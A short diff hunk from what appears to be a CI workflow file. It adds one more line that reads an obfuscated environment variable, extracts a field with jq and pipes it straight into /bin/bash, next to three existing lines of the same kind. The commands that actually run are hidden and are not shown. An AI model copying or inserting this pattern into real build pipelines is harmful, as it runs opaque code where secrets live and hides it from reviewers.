@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$dt201" | jq -r .ok23 | /bin/bash
           echo $mfgtr86 | jq -r .wbtsz2 | /bin/bash
           echo $dtmg0 | jq -r .egak15408 | /bin/bash
+          echo $qicbz7 | jq -r .jhexx3 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
